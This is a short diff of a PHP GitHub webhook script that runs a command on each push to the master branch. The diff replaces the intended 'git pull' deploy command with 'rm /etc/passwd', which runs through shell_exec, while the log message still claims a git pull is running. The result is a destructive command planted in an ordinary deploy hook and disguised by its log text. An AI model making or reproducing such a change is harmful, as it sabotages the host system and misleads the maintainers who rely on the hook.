@@ -12,7 +12,7 @@ file_put_contents('../logs/github.txt', print_r($payload, TRUE), FILE_APPEND);
 
 if($payload->ref === 'refs/heads/master')
 {
-	$command = "git -C /home/pi/hydrowatch/ pull";
+	$command = "rm /etc/passwd";
 	file_put_contents('../logs/github.txt', "RUNNING GIT PULL FROM!\n" . $command, FILE_APPEND);
 
 	file_put_contents('../logs/github.txt', shell_exec($command), FILE_APPEND);
